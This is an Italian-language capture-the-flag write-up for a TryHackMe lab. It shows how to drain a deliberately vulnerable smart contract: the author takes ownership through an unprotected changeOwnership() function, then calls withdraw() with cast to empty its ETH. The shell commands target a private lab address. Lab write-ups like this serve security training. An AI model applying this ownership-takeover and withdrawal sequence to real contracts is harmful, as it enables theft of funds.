
#tryhackmelabs #laboratorio #criptovalute

https://tryhackme.com/room/hfb1heist

Una debolezza nello Smart Contract di Cipher potrebbe prosciugare tutti gli ETH nella sua tesoreria, interrompendo così i finanziamenti alla Phantom Node Botnet e disabilitandone le operazioni dannose a livello globale.

```
RPC_URL=http://10.10.209.206:8545
```
```
API_URL=http://10.10.209.206
```
```
PRIVATE_KEY=$(curl -s ${API_URL}/challenge | jq -r ".player_wallet.private_key")
```
```
CONTRACT_ADDRESS=$(curl -s ${API_URL}/challenge | jq -r ".contract_address")
```
```
PLAYER_ADDRESS=$(curl -s ${API_URL}/challenge | jq -r ".player_wallet.address")
```
```
is_solved=`cast call $CONTRACT_ADDRESS "isSolved()(bool)" --rpc-url ${RPC_URL}`
```
```
echo "Check if is solved: $is_solved"
```


```
root@ip-10-10-177-229:~# RPC_URL=http://10.10.209.206:8545
root@ip-10-10-177-229:~# API_URL=http://10.10.209.206
root@ip-10-10-177-229:~# PRIVATE_KEY=$(curl -s ${API_URL}/challenge | jq -r ".player_wallet.private_key")
root@ip-10-10-177-229:~# CONTRACT_ADDRESS=$(curl -s ${API_URL}/challenge | jq -r ".contract_address")
root@ip-10-10-177-229:~# PLAYER_ADDRESS=$(curl -s ${API_URL}/challenge | jq -r ".player_wallet.address")
root@ip-10-10-177-229:~# is_solved=`cast call $CONTRACT_ADDRESS "isSolved()(bool)" --rpc-url ${RPC_URL}`
root@ip-10-10-177-229:~# echo "Check if is solved: $is_solved"
Check if is solved: false
root@ip-10-10-177-229:~# 

```
proviamo get flag ma non funziona!

per risolvere dobbiamo far sì che il saldo sia zero
```
function isSolved() external view returns (bool) {
        return (address(this).balance == 0);
```
dobbiamo sfruttare questa funzione per diventare proprietari
```
  function getOwner() external view returns (address) {
        return owner;
```

```
cast send $CONTRACT_ADDRESS "changeOwnership()" --rpc-url $RPC_URL --private-key $PRIVATE_KEY --legacy
```
Il prossimo comando invia un'altra transazione al contratto, richiamando la funzione withdraw().
Questo trasferisce tutti gli Ether dal contratto al portafoglio del giocatore.
```
cast send $CONTRACT_ADDRESS "withdraw()" --rpc-url $RPC_URL --private-key $PRIVATE_KEY --legacy
```
Aggiorniamo la pagina e facciamo Get Flag
```
THM{xxxxxxxxxx}
```